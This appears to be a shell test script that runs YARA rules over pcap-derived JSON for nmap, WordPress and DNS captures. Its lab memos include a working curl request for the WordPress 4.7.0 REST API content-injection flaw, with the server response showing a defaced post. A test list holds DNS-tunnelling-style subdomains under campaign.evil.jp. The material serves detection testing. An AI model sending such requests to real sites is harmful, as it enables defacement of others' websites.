#!/bin/sh

script_dir=$(cd $(dirname $0); pwd)
cd $script_dir

gomi=".[012][0-9]{,4}"
if [ -e $gomi ]; then
    rm $gomi
fi

pcap2json(){
    for file in $*; do
        tshark -r $file -T json > ${file/%.pcap/.json} 
    done
}

do_test(){
    RULE=$1
    FILE=$2
    echo "[*] === [yara $RULE $FILE] ==="
    time ../yara/yara -gmf $RULE $FILE
}

### https://wiki.wireshark.org/SampleCaptures?action=AttachFile&do=view&target=NMap+Captures.zip
### => nmap_standard_scan.pcap

pcap2json data/*.pcap

do_test test_rule.yar data/nmap_standard_scan.json
do_test test_rule.yar data/wordpress-4.7.0-unauthorized-contents-injection.json
do_test test_rule.yar data/dig_domains.json

# docker pull wordpress:4.7.0 # 4.7.5
# docker pull mysql
# docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql
# docker run --name vuln-wordpress --link some-mysql:mysql -d wordpress:4.7.0

echo "[*] === [yara-python test] ==="
LD_PRELOAD=../yara/libyara/.libs/libyara.so python yara-pcap-test.py test_rule.yar data/nmap_standard_scan.json
LD_PRELOAD=../yara/libyara/.libs/libyara.so python yara-pcap-test.py test_rule.yar data/wordpress-4.7.0-unauthorized-contents-injection.json

memo="
K_atc% docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql   
890d07924d7cd173fd90e40d898482102285ff75d0e84b5278225fcfd99ce37c                
K_atc% docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES
890d07924d7c        mysql               "docker-entrypoint..."   19 seconds ago      Up 18 seconds       3306/tcp            some-mysql
K_atc% docker run --name vuln-wordpress --link some-mysql:mysql -d wordpress:4.7.0 
c4de36828288847557269789c5deaa4bbc437db890d3a23e5b5dea4d19c9b85d      
K_atc% docker inspect --format '{{ .NetworkSettings.IPAddress }}' vuln-wordpress 
172.17.0.3 
# user:pass = root:root
"

memo_attacker="
docker run ubuntu:16.04
apt update
apt install curl dnsutils
# wget https://gist.githubusercontent.com/leonjza/2244eb15510a0687ed93160c623762ab/raw/782d88f0e8b63b281fdf33f94525f35cb8392ea5/inject.py
pip install lxml
curl 172.17.0.3
# attack on post_id = 1 
curl -d 'id=1justrawdata' -d 'title=You have been hacked' -d 'content=Hacked please update your wordpress version' http://172.17.0.3/index.php/wp-json/wp/v2/posts/1
"

vuln_docker="
https://www.dropbox.com/s/q2jmavanifukkci/wordpress-4.7.0.tar.gz?dl=0
docker build -t vuln-wordpress:4.7.0
docker run --rm --name vuln-wordpress --link some-mysql:mysql -d vuln-wordpress:4.7.0
K_atc% docker inspect --format '{{ .NetworkSettings.IPAddress }}' vuln-wordpress 
172.17.0.3 


"

# in attacker
# https://github.com/linuxsec/pentest/blob/master/ruby/wordpress/41224.rb
# root@09d2bc99941c:~# curl -d 'id=1justrawdata' -d 'title=You have been hacked' -d 'content=Hacked please update your wordpress version' http://172.17.0.3/index.php/wp-json/wp/v2/posts/1
# {"id":1,"date":"2017-07-07T15:13:25","date_gmt":"2017-07-07T15:13:25","guid":{"rendered":"http:\/\/172.17.0.3\/?p=1","raw":"http:\/\/172.17.0.3\/?p=1"},"modified":"2017-07-07T16:34:47","modified_gmt":"2017-07-07T16:34:47","password":"","slug":"hello-world","status":"publish","type":"post","link":"http:\/\/172.17.0.3\/2017\/07\/07\/hello-world\/","title":{"raw":"You have been hacked","rendered":"You have been hacked"},"content":{"raw":"Hacked please update your wordpress version","rendered":"<p>Hacked please update your wordpress version<\/p>\n","protected":false},"excerpt":{"raw":"","rendered":"<p>Hacked please update your wordpress version<\/p>\n","protected":false},"author":1,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":[],"categories":[1],"tags":[],"_links":{"self":[{"href":"http:\/\/172.17.0.3\/wp-json\/wp\/v2\/posts\/1"}],"collection":[{"href":"http:\/\/172.17.0.3\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"http:\/\/172.17.0.3\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"http:\/\/172.17.0.3\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"http:\/\/172.17.0.3\/wp-json\/wp\/v2\/comments?post=1"}],"version-history":[{"href":"http:\/\/172.17.0.3\/wp-json\/wp\/v2\/posts\/1\/revisions"}],"wp:attachment":[{"href":"http:\/\/172.17.0.3\/wp-json\/wp\/v2\/media?parent=1"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"http:\/\/172.17.0.3\/wp-json\/wp\/v2\/categories?post=1"},{"taxonomy":"post_tag","embeddable":true,"href":"http:\/\/172.17.0.3\/wp-json\/wp\/v2\/tags?post=1"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}root@09d2bc99941c:~# 

test_domain_list="
ec2-54-76-230-19.eu-west-1.compute.amazonaws.com
ec2-35-176-236-15.eu-west-2.compute.amazonaws.com
motorsport.com-cdn.s3.amazonaws.com
ec2-35-177-244-247.eu-west-2.compute.amazonaws.com
ec2-35-177-225-135.eu-west-2.compute.amazonaws.com
appd-cdn.s3-website-us-east-1.amazonaws.com
ec2-35-176-151-161.eu-west-2.compute.amazonaws.com
ec2-35-176-174-47.eu-west-2.compute.amazonaws.com
EVIEIRRNGEXDMDJF4LR4.campaign.evil.jp
7UYNBIZDCOBAGAQG6YTK.campaign.evil.jp
BU6DYL2MNFXGKYLSNF5G.campaign.evil.jp
KZBAGEXUYIBSGIZDEMZS.campaign.evil.jp
HAXU6IBSGIYC6RJAHAZD.campaign.evil.jp
ONBSGAXU4IBWF5KCAMRS.campaign.evil.jp
GIYTMNBQF5ECAWZAG4YT.campaign.evil.jp
IIBUGEYV2PR6BVSW4ZDP.campaign.evil.jp
0a0a0a0a202020202020202020200a20.campaign.evil.jp
2020202020202020200a202020202020.campaign.evil.jp
544845200a434f4d504c455445200a53.campaign.evil.jp
4845524c4f434b200a484f4c4d45530a.campaign.evil.jp
0a202020202020202020200a20202020.campaign.evil.jp
2020202020200a202020202020202020.campaign.evil.jp
200a20417274687572200a436f6e616e.campaign.evil.jp
200a446f796c650a0a0a0a2020202020.campaign.evil.jp
"